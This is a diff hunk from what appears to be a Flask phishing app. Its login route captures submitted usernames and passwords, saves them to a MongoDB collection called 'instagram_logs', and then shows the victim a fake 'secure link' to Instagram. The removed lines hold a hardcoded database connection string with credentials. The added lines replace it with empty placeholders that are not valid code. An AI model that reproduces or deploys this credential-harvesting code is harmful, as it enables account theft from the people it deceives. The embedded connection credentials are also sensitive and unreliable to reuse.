@@ -38,9 +38,9 @@ def login():
     if request.method == "POST":
         username = request.form["user"]
         password =request.form["passwd"]
-        cluster = MongoClient("mongodb+srv://Admin:admin1234@cluster0.qvkpc.mongodb.net/myFirstDatabase?retryWrites=true&w=majority") #your mongodb app connnect link(important)
-        data = cluster["instagram_logs"] #your database name 
-        classs = data["logs"] #your collection name 
+        cluster = MongoClient() #your mongodb app connnect link(important)
+        data = cluster[] #your database name 
+        classs = data[] #your collection name 
         post = {"login": username, "password": password}
         classs.insert_one(post)
         return "<h1>Here is your secure link</h1><a href='https://www.instagram.com/'>secure link</a>"
